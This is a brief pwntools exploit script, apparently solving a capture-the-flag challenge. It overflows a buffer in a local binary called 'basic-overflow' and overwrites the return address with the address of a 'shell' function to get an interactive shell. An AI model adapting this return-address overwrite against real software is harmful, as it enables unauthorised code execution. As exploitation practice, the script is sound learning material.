from pwn import *
import pwnlib.util.packing as pack

elf = ELF('./basic-overflow', checksec=False)
context.binary = elf
#context.log_level = "DEBUG"
winfunc = elf.symbols['shell']

p = process('./basic-overflow')
# gdb.attach(p)

# p.sendline(cyclic(1024))

offset = cyclic_find(b'saaa')
payload = b'A'*offset + pack.p64(winfunc)
p.sendline(payload)
p.interactive()
